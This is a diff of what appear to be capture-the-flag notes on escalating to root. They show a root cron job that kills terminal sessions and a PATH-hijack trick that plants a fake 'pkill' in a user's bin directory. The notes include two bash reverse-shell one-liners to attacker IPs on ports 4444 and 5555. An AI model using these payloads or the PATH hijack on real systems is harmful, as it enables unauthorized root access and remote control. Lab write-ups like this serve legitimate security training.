@@ -37,7 +37,22 @@ log in ssh and givin a reverse shell on ssh
 
 check on cron.d/persistence
 
-edit pkill in home/user/bin like this
+cat /etc/cron.d/persistence
+PATH=/home/lachlan/bin:/bin:/usr/bin
+# * * * * * root backup.sh
+* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+
+
+pkill command not triggering from the path variable. so we can create fake pkill script in username/bin dir and it will triger in every minute.  edit pkill in home/user/bin like this
+
+[bash -c 'bash -i >& /dev/tcp/10.8.0.247/4444 0>&1']
 
 [bash -c 'exec bash -i &>/dev/tcp/10.4.41.28/5555 <&1']
+
+
 
